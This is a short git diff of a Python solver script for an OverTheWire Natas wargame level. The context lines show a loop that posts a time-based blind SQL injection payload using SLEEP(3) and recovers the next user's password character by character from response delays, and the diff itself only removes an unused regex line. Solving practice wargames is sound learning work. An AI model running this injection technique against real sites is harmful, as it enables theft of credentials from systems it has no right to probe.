@@ -25,8 +25,6 @@ while(i<32):
         #session = r.get('http://natas11.natas.labs.overthewire.org/', auth=(USER, PASSWORD'))
         response = r.post(url, data= {"username":'natas18" and hex(password) like "'+key+decimales+'%" and SLEEP(3) #'},auth=(USER, PASSWORD))
 
-        
-        content = re.findall('<pre>\n(.*)\n</pre>',response.text)
         if (response.elapsed.total_seconds()>2):
             key = key + decimales
             print("[+] Letter found, Key: " + str(key.decode("hex")))
